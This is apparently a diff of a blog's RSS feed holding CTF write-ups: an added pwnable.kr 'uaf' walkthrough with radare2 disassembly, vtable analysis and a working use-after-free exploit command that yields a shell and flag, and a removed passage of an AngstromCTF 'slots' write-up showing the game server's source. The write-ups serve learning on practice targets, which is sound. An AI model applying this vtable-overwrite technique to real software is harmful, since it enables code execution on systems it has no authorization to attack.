+|   | ||!   0x00400fdf      4889c7         mov rdi, rax
+|   | ||!   0x00400fe2      ffd2           call rdx
+|   | ||!   0x00400fe4      488b45d0       mov rax, qword [rbp - local_30h]
+|   | ||!   0x00400fe8      488b00         mov rax, qword [rax]
+|   | ||!   0x00400feb      4883c008       add rax, 8
+|   | ||!   0x00400fef      488b10         mov rdx, qword [rax]
+|   | ||!   0x00400ff2      488b45d0       mov rax, qword [rbp - local_30h]
+|   | ||!   0x00400ff6      4889c7         mov rdi, rax
+|   | ||!   0x00400ff9      ffd2           call rdx
+|   |,====&amp;lt; 0x00400ffb      e9a9000000     jmp 0x4010a9
+|   ||||!      ; JMP XREF from 0x00400fb8 (sym.main)
+|   |||`--&amp;gt; 0x00401000      488b45a0       mov rax, qword [rbp - local_60h]
+|   ||| !   0x00401004      4883c008       add rax, 8
+|   ||| !   0x00401008      488b00         mov rax, qword [rax]
+|   ||| !   0x0040100b      4889c7         mov rdi, rax
+|   ||| !   0x0040100e      e80dfdffff     call sym.imp.atoi          ; int atoi(const char *str)
+|   ||| !   0x00401013      4898           cdqe
+|   ||| !   0x00401015      488945d8       mov qword [rbp - local_28h], rax
+|   ||| !   0x00401019      488b45d8       mov rax, qword [rbp - local_28h]
+|   ||| !   0x0040101d      4889c7         mov rdi, rax
+|   ||| !   0x00401020      e84bfcffff     call sym.operatornew__
+|   ||| !   0x00401025      488945e0       mov qword [rbp - local_20h], rax
+|   ||| !   0x00401029      488b45a0       mov rax, qword [rbp - local_60h]
+|   ||| !   0x0040102d      4883c010       add rax, 0x10
+|   ||| !   0x00401031      488b00         mov rax, qword [rax]
+|   ||| !   0x00401034      be00000000     mov esi, 0
+|   ||| !   0x00401039      4889c7         mov rdi, rax
+|   ||| !   0x0040103c      b800000000     mov eax, 0
+|   ||| !   0x00401041      e87afdffff     call sym.imp.open          ; int open(const char *path, int oflag)
+|   ||| !   0x00401046      488b55d8       mov rdx, qword [rbp - local_28h]
+|   ||| !   0x0040104a      488b4de0       mov rcx, qword [rbp - local_20h]
+|   ||| !   0x0040104e      4889ce         mov rsi, rcx
+|   ||| !   0x00401051      89c7           mov edi, eax
+|   ||| !   0x00401053      e848fcffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|   ||| !   0x00401058      be13154000     mov esi, str.your_data_is_allocated ; &quot;your data is allocated&quot; @ 0x401513
+|   ||| !   0x0040105d      bf60226000     mov edi, obj.std::cout      ; obj.std::cout
+|   ||| !   0x00401062      e889fcffff     call sym.std::operator___std::char_traits_char__
+|   ||| !   0x00401067      be600d4000     mov esi, sym.std::endl_char_std::char_traits_char__ ; sym.std::endl_char_std::char_traits_char__
+|   ||| !   0x0040106c      4889c7         mov rdi, rax
+|   ||| !   0x0040106f      e8dcfcffff     call sym.std::ostream::operator__
+|   |||,==&amp;lt; 0x00401074      eb33           jmp 0x4010a9
+|   ||||!      ; JMP XREF from 0x00400fbd (sym.main)
+|   ||`---&amp;gt; 0x00401076      488b5dc8       mov rbx, qword [rbp - local_38h]
+|   || |!   0x0040107a      4885db         test rbx, rbx
+|   ||,===&amp;lt; 0x0040107d      7410           je 0x40108f
+|   ||||!   0x0040107f      4889df         mov rdi, rbx
+|   ||||!   0x00401082      e8b3010000     call sym.Human::_Human
+|   ||||!   0x00401087      4889df         mov rdi, rbx
+|   ||||!   0x0040108a      e8f1fbffff     call sym.operatordelete
+|   ||||!      ; JMP XREF from 0x0040107d (sym.main)
+|   ||`---&amp;gt; 0x0040108f      488b5dd0       mov rbx, qword [rbp - local_30h]
+|   || |!   0x00401093      4885db         test rbx, rbx
+|   ||,===&amp;lt; 0x00401096      7410           je 0x4010a8
+|   ||||!   0x00401098      4889df         mov rdi, rbx
+|   ||||!   0x0040109b      e89a010000     call sym.Human::_Human
+|   ||||!   0x004010a0      4889df         mov rdi, rbx
+|   ||||!   0x004010a3      e8d8fbffff     call sym.operatordelete
+|   ||||!      ; JMP XREF from 0x00401096 (sym.main)
+|   ||`---&amp;gt; 0x004010a8      90             nop
+|   || ||      ; JMP XREF from 0x00401074 (sym.main)
+|   || ||      ; JMP XREF from 0x00400ffb (sym.main)
+|   || ||      ; JMP XREF from 0x00400fc8 (sym.main)
+\   ``-``=&amp;lt; 0x004010a9      e9e4feffff     jmp 0x400f92
+[0x00400ec4]&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From here we can extract some basic bits of information essential for the further exploitation. First option &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is made from this code below.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;|   |`----&amp;gt; 0x00400fcd      488b45c8       mov rax, qword [rbp - local_38h]
+|   | ||!   0x00400fd1      488b00         mov rax, qword [rax]
+|   | ||!   0x00400fd4      4883c008       add rax, 8
+|   | ||!   0x00400fd8      488b10         mov rdx, qword [rax]
+|   | ||!   0x00400fdb      488b45c8       mov rax, qword [rbp - local_38h]
+|   | ||!   0x00400fdf      4889c7         mov rdi, rax
+|   | ||!   0x00400fe2      ffd2           call rdx
+|   | ||!   0x00400fe4      488b45d0       mov rax, qword [rbp - local_30h]
+|   | ||!   0x00400fe8      488b00         mov rax, qword [rax]
+|   | ||!   0x00400feb      4883c008       add rax, 8
+|   | ||!   0x00400fef      488b10         mov rdx, qword [rax]
+|   | ||!   0x00400ff2      488b45d0       mov rax, qword [rbp - local_30h]
+|   | ||!   0x00400ff6      4889c7         mov rdi, rax
+|   | ||!   0x00400ff9      ffd2           call rdx&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here we can see a repetive code for both calls of &lt;code class=&quot;highlighter-rouge&quot;&gt;introduce()&lt;/code&gt; methods. As we have instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;call rdx&lt;/code&gt; we can suspect that &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; holds the address of introduce method. Register &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; get’s it’s value from &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, qword [rax]&lt;/code&gt;, with additional incrementation of &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; value in &lt;code class=&quot;highlighter-rouge&quot;&gt;add rax, 8&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[0x0040123a]&amp;gt; pdf @sym.Man::Man
+/ (fcn) sym.Man::Man 83
+|   sym.Man::Man ();
+|           ; var int local_24h @ rbp-0x24
+|           ; var int local_20h @ rbp-0x20
+|           ; var int local_18h @ rbp-0x18
+|              ; CALL XREF from 0x00400f13 (sym.main)
+|           0x00401264      55             push rbp
+|           0x00401265      4889e5         mov rbp, rsp
+|           0x00401268      53             push rbx
+|           0x00401269      4883ec28       sub rsp, 0x28               ; '('
+|           0x0040126d      48897de8       mov qword [rbp - local_18h], rdi
+|           0x00401271      488975e0       mov qword [rbp - local_20h], rsi
+|           0x00401275      8955dc         mov dword [rbp - local_24h], edx
+|           0x00401278      488b45e8       mov rax, qword [rbp - local_18h]
+|           0x0040127c      4889c7         mov rdi, rax
+|           0x0040127f      e88cffffff     call sym.Human::Human
+|           0x00401284      488b45e8       mov rax, qword [rbp - local_18h]
+|           0x00401288      48c700701540.  mov qword [rax], 0x401570   ; [0x401570:8]=0x40117a sym.Human::give_shell ; &quot;z.@&quot;
+|           0x0040128f      488b45e8       mov rax, qword [rbp - local_18h]
+|           0x00401293      488d5010       lea rdx, [rax + 0x10]       ; 0x10
+|           0x00401297      488b45e0       mov rax, qword [rbp - local_20h]
+|           0x0040129b      4889c6         mov rsi, rax
+|           0x0040129e      4889d7         mov rdi, rdx
+|           0x004012a1      e80afbffff     call sym.std::string::operator_
+|           0x004012a6      488b45e8       mov rax, qword [rbp - local_18h]
+|           0x004012aa      8b55dc         mov edx, dword [rbp - local_24h]
+|           0x004012ad      895008         mov dword [rax + 8], edx
+|           0x004012b0      4883c428       add rsp, 0x28               ; '('
+|           0x004012b4      5b             pop rbx
+|           0x004012b5      5d             pop rbp
+\           0x004012b6      c3             ret&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;With that information, we are ready to disassemble the &lt;code class=&quot;highlighter-rouge&quot;&gt;Man&lt;/code&gt; object and first thing that comes to my mind is this line &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword [rax], 0x401570   ; [0x401570:8]=0x40117a sym.Human::give_shell ; &quot;z.@&quot;&lt;/code&gt;. Now we can suspect that address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401570&lt;/code&gt; is the address of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Virtual_method_table&quot;&gt;vtable&lt;/a&gt; of this class.&lt;/p&gt;
+
+&lt;p&gt;Every class containing virtual functions gets its own vtable that is used to resolve the address of te virtual function whenever such function is called. Luckily, we can list vtables with &lt;code class=&quot;highlighter-rouge&quot;&gt;radare2&lt;/code&gt; command &lt;code class=&quot;highlighter-rouge&quot;&gt;av&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[0x00400de0]&amp;gt; av?
+|Usage: av analyze the .rodata section and list virtual function present
+
+
+[0x00400de0]&amp;gt; av
+
+Vtable Found at 0x00401550
+0x00401550 : sym.Human::give_shell
+0x00401558 : sym.Woman::introduce
+
+
+Vtable Found at 0x00401570
+0x00401570 : sym.Human::give_shell
+0x00401578 : sym.Man::introduce
+
+
+Vtable Found at 0x00401590
+0x00401590 : sym.Human::give_shell
+0x00401598 : sym.Human::introduce&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, our assumptions are correct and address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00401570&lt;/code&gt; is the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Man&lt;/code&gt; class vtable. But why after calling this address, method &lt;code class=&quot;highlighter-rouge&quot;&gt;introduce()&lt;/code&gt; is called instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell()&lt;/code&gt;?&lt;/p&gt;
+
+&lt;p&gt;Coming back to disassembly of &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function, we have to remember that during the call address is incremented with &lt;code class=&quot;highlighter-rouge&quot;&gt;add rax, 8&lt;/code&gt;. So in order to call the &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell()&lt;/code&gt; function, we have to decrement &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00401570&lt;/code&gt; by 8.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00401570&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'0x401568'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we have the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;give_shell()&lt;/code&gt; that we can use in our exploit. Few runs of &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; option may guarantee that these bytes are at correct place.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;uaf@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print(&quot;\x68\x15\x40\x00\x00\x00\x00\x00&quot;)'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/attackme
+uaf@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./uaf 8 /tmp/attackme
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag  
+yay_f1ag_aft3r_pwning&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Sun, 08 Jul 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/pwnable.kr-uaf/</link>
+        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-uaf/</guid>
+      </item>
+    
+      <item>
         <title>Pwnable.kr - passcode</title>
         <description>&lt;p&gt;To my surprise, I’ve noticed that I have missed one previous challenge called &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;. Let’s come back to it.&lt;/p&gt;
 
@@ -1495,274 +1901,6 @@ Program exited with code 051.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Fri, 23 Mar 2018 05:00:00 +0100</pubDate>
         <link>http://localhost:4000/angstromctf-md5/</link>
         <guid isPermaLink="true">http://localhost:4000/angstromctf-md5/</guid>
-      </item>
-    
-      <item>
-        <title>AngstromCTF - slots</title>
-        <description>&lt;p&gt;In this challenge I’m going to show how focusing on only one attack vector may make you fail hard.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Category: Misc&lt;/li&gt;
-  &lt;li&gt;Points: 90&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;defund is building a casino empire. Break his slot machine, which is running at web.angstromctf.com:3002. Note: connect with netcat or an equivalent tool.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;At the beginning, we’re given a source of an application running on certain port &lt;code class=&quot;highlighter-rouge&quot;&gt;web.angstromctf.com:3002&lt;/code&gt;. By connecting to this port using &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;, we’re given a simple blackjack game, taking an user bet and then making the random choice.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-test&quot; data-lang=&quot;test&quot;&gt;$ nc web.angstromctf.com 3002                                                           
-Welcome to Fruit Slots!
-We've given you $10.00 on the house.
-Once you're a high roller, we'll give you a flag.
-You have $10.00.
-Enter your bet: 5
-🍐 : 🍈 : 🍈
-🍉 : 🍇 : 🍒 ◀
-🍒 : 🍌 : 🍒
-You lost everything.
-Play more to become a high roller!
-You have $5.00.
-Enter your bet: 5
-🍐 : 🍌 : 🍒
-🍇 : 🍌 : 🍒 ◀
-🍒 : 🍇 : 🍉
-You lost everything.
-You have no money left. Low roller.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But as we have the source code, let’s take a look at it.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# coding: utf8&lt;/span&gt;
-
-import random
-import signal
-import SocketServer
-
-flag &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag.txt'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.read&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-
-PORT &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3002
-
-FRUITS &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'🍌'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'🍒'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'🍐'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'🍈'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'🍇'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'🍊'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'🍉'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-COMBOS &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-	&lt;span class=&quot;s1&quot;&gt;'🍌3'&lt;/span&gt;: 1,
-	&lt;span class=&quot;s1&quot;&gt;'🍒2'&lt;/span&gt;: 1,
-	&lt;span class=&quot;s1&quot;&gt;'🍐2'&lt;/span&gt;: 3,
-	&lt;span class=&quot;s1&quot;&gt;'🍈2'&lt;/span&gt;: 3,
-	&lt;span class=&quot;s1&quot;&gt;'🍇2'&lt;/span&gt;: 3,
-	&lt;span class=&quot;s1&quot;&gt;'🍊2'&lt;/span&gt;: 3,
-	&lt;span class=&quot;s1&quot;&gt;'🍉2'&lt;/span&gt;: 3,
-	&lt;span class=&quot;s1&quot;&gt;'🍒3'&lt;/span&gt;: 3,
-	&lt;span class=&quot;s1&quot;&gt;'🍐3'&lt;/span&gt;: 10,
-	&lt;span class=&quot;s1&quot;&gt;'🍈3'&lt;/span&gt;: 10,
-	&lt;span class=&quot;s1&quot;&gt;'🍇3'&lt;/span&gt;: 10,
-	&lt;span class=&quot;s1&quot;&gt;'🍊3'&lt;/span&gt;: 10,
-	&lt;span class=&quot;s1&quot;&gt;'🍉3'&lt;/span&gt;: 10
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-def line&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;random.choice&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FRUITS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;range&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
-
-def payout&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fruit &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;line:
-		combo &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; fruit + str&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line.count&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fruit&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#count the number of occuring fruits&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;combo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;COMBOS:
-			&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;COMBOS[combo]
-	&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;0
-
-class incoming&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SocketServer.BaseRequestHandler&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-	def handle&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-		req &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; self.request
-
-		def receive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
-			buf &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;not buf.endswith&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-				buf +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; req.recv&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;buf[:-1]
-
-		signal.alarm&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-		req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Welcome to Fruit Slots!\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-		req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Weve given you $10.00 on the house.\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-		req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Once youre a high roller, well give you a flag.\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-		money &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10
-		&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;True:
-			req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You have ${0:.2f}.\n'&lt;/span&gt;.format&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;money&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-			req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Enter your bet: '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-			bet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; receive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-
-			try:
-				bet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; float&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-			except:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Your bet must be a number!\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-				req.close&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;return
-
-			if &lt;/span&gt;bet &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Sneaky, but not good enough.\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-				req.close&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;return
-			elif &lt;/span&gt;bet &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; money:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You dont have enough money to wager this.\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-				req.close&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;return
-
-			&lt;/span&gt;line1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; line&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-			line2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; line&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-			line3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; line&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;payout&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-				line2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; line&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-			win &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; bet &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; payout&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-			money +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; win - bet
-
-			req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'{}\n{} ◀\n{}\n'&lt;/span&gt;.format&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' : '&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;' : '&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;' : '&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;line3&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;win &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You won ${0:.2f}!'&lt;/span&gt;.format&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;win&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You lost everything.\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;money &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You have no money left. Low roller.\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-				req.close&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;return
-			elif &lt;/span&gt;money &amp;lt; 1000000000:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Play more to become a high roller!\n'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;:
-				req.sendall&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Wow, you\'&lt;/span&gt;re a high roller!&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;')
-				req.sendall('&lt;/span&gt;A flag: &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.format(flag))
-				return
-
-class ReusableTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):
-	pass
-
-SocketServer.TCPServer.allow_reuse_address = True
-server = ReusableTCPServer(('&lt;/span&gt;0.0.0.0&lt;span class=&quot;s1&quot;&gt;', PORT), incoming)
-
-print '&lt;/span&gt;Server listening on port %d&lt;span class=&quot;s1&quot;&gt;' % PORT
-server.serve_forever()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;From the start we can see that the input is converting our numbers to float with &lt;code class=&quot;highlighter-rouge&quot;&gt;bet = float(bet)&lt;/code&gt;, then it performs checks that will determine whether the numbers isn’t smaller than 0, and if it’s not bigger than our current money status.&lt;/p&gt;
-
-&lt;p&gt;After that the application will generate three lines, with the second/middle one used to generate our outcome.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;line1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
